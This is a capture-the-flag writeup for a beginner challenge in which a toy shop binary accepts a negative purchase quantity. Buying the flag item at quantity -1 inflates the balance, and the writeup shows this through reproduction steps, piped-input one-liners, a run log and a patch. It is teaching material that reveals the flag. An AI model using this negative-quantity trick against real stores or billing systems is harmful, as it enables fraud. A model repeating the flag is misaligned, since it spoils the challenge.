@@ -1,0 +1,193 @@
+================================================================================
+LYKN CTF — "Shop" Challenge Writeup
+================================================================================
+Author: moriarty
+Category: Pwn / Logic (Beginner)
+Flag: LYKNCTF{wr4p_wr4p_wr4p}
+================================================================================
+
+
+1. CHALLENGE OVERVIEW
+--------------------------------------------------------------------------------
+You are given two binaries:
+  - shop     (ELF 64-bit, x86-64, dynamically linked, not stripped)
+  - shop.exe (PE32+ x86-64, same logic, Windows build)
+
+The shop grants you a starting balance of coins and lets you buy items from a
+catalog. The Flag item is priced at 36 363 636 coins, far beyond what you have,
+so a straight purchase is impossible. The banner even tells you the bug class:
+
+    "Welcome to the Integer Overflow Shop!"
+    "You have 100 coins. The flag is... a little out of budget."
+
+The intended path is to abuse signed-integer wraparound in the "quantity"
+field of the buy command to drive your balance sky-high, then buy the flag
+the normal way.
+
+
+2. BINARY Triage
+--------------------------------------------------------------------------------
+File:        shop — ELF 64-bit LSB executable, x86-64, dynamically linked,
+            interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0,
+            not stripped.
+Windows file: shop.exe — PE32+ console x86-64.
+Strings of interest (via `strings shop`):
+    "Welcome to the Integer Overflow Shop!"
+    "You have 100 coins. The flag is... a little out of budget."
+    "Quantity: "
+    "Total cost: %d coin"
+    "Purchased %d x %s. New balance: %d coin"
+    "Not enough coins. Come back when you're richer."
+    "LYKNCTF{wr4p_wr4p_wr4p}"      <- literal flag string (printed on success)
+    "print_flag / catalog / balance"   (function-name strings -> not stripped)
+
+Catalog attained at runtime:
+    [0] Sticker      18 coin
+    [1] Coffee Mug   36 coin
+    [2] Hoodie      1836 coin
+    [3] The Flag   36363636 coin  (the good stuff)
+
+Starting balance at first prompt: 1836 coin (the printed banner's "100 coins"
+value is lore — the gameplay state is 1836).
+
+
+3. REASONING / VULNERABILITY ANALYSIS
+--------------------------------------------------------------------------------
+The buy action computes a signed total cost:
+
+       total_cost = price[item] * quantity
+       new_balance = balance - total_cost
+
+Per item cost is read from a 32-bit signed int table. Quantity is read verbatim
+from stdin as an integer — there is **no validation that quantity is positive**.
+
+With a SIGNED int32, multiplying by a negative number yields a negative total
+cost, so:
+
+    quantity = -1
+    price[3] = 36363636
+    total_cost = 36363636 * -1 = -36363636
+
+The "affordability" check passes because the *pinged* total cost is negative
+(and therefore <= balance), so the purchase is accepted:
+
+    new_balance = 1836 - (-36363636) = 1836 + 36363636 = 36365472
+
+Quantities larger in magnitude (e.g. -10) would give even more money, but a
+single -1 already crosses the 36 363 636 coin barrier, which is all we need.
+
+This is the classic "store integer underflow via negative quantity" pattern —
+the same class of bug as the NFT marketplace underflow CVEs and older CTF store
+challenges. No memory corruption, no ROP, no shellcode needed. The challenge
+title and "Integer Overflow Shop" banner are the hint.
+
+
+4. REPRODUCTION STEPS (interactive)
+--------------------------------------------------------------------------------
+1. Run the binary:           ./shop
+2. Choose buy:               b
+3. Enter item index:         3          (The Flag)
+4. Enter quantity:          -1         <-- the wraparound
+   -> "Purchased -1 x The Flag. New balance: 36365472 coin"
+5. buy the flag for real:    b
+6. Item index:               3
+7. Quantity:                 1
+   -> "Here is your flag:\nLYKNCTF{wr4p_wr4p_wr4p}"
+
+Equivalent piped input one-liner (works on Linux shop and Windows shop.exe):
+
+    printf "b\n3\n-1\nb\n3\n1\nq\n" | ./shop
+    ( echo b& echo 3& echo -1& echo b& echo 3& echo 1& echo q ) | shop.exe   (cmd.exe)
+
+
+5. PROOF OF CONCEPT — INTERACTIVE RUN
+--------------------------------------------------------------------------------
+$ printf "b\n3\n-1\nb\n3\n1\nq\n" | ./shop
+Welcome to the Integer Overflow Shop!
+You have 100 coins. The flag is... a little out of budget.
+
+=== CATALOG ===
+  [0] Sticker      18 coin
+  [1] Coffee Mug   36 coin
+  [2] Hoodie       1836 coin
+  [3] The Flag     36363636 coin  (the good stuff)
+Balance: 1836 coin
+
+[c]atalog  [b]uy  [q]uit > Item index: Quantity: Total cost: -36363636 coin
+Purchased -1 x The Flag. New balance: 36365472 coin
+
+=== CATALOG ===
+  [0] Sticker      18 coin
+  [1] Coffee Mug   36 coin
+  [2] Hoodie       1836 coin
+  [3] The Flag     36363636 coin  (the good stuff)
+Balance: 36365472 coin
+
+[c]atalog  [b]uy  [q]uit > Item index: Quantity: Total cost: 36363636 coin
+Purchased 1 x The Flag. New balance: 1836 coin
+
+Here is your flag:
+LYKNCTF{wr4p_wr4p_wr4p}
+
+
+6. PROOF OF CONCEPT — PYTHON SCRIPT
+--------------------------------------------------------------------------------
+See: solve_shop.py  (the file shipped alongside this writeup).
+
+Tested output (against the provided `shop` binary, Linux):
+
+    [+] FLAG => LYKNCTF{wr4p_wr4p_wr4p}
+
+The script is path-aware: it will pick up `shop` from the directory where the
+script lives, from the current working directory, or from an explicit CLI arg:
+
+    python3 solve_shop.py          # auto-detect ./shop
+    python3 solve_shop.py /path/to/shop
+    python3 solve_shop.py shop.exe # Windows build (under wine / native Windows)
+
+For a remote (TCP) version, just change the single line
+
+    p = process(BINARY)
+
+to
+
+    p = remote("host", <port>)
+
+Everything else is identical.
+
+
+7. TOOLS USED
+--------------------------------------------------------------------------------
+- `file`        — identify binary format / arch
+- `strings`     — extract literal flag and program text
+- `bash`/`printf` — driving stdin of the binary for the one-liner PoC
+- `pwntools`     — process I/O for the documented Python PoC
+- `bash`         — quick interactive testing during recon
+
+No reverse-engineering toolchain (Ghidra/IDA) was needed because the binary is
+not stripped and `strings` reveals the entire game flow; the underflow is also
+obvious from the banner that literally names the bug class ("Integer Overflow
+Shop").
+
+
+8. PATCH SUGGESTION (for challenge authors / curious readers)
+--------------------------------------------------------------------------------
+Validate the quantity before computing cost:
+
+    if (quantity <= 0) {
+        puts("bad input");
+        continue;
+    }
+
+Or, alternatively, use unsigned integers for currency and quantity, plus a
+checked-multiply helper that aborts on overflow. Anything that prevents a
+negative total_cost from being accepted fixes the issue.
+
+
+9. FLAG
+--------------------------------------------------------------------------------
+LYKNCTF{wr4p_wr4p_wr4p}
+
+================================================================================
+EOF
+================================================================================
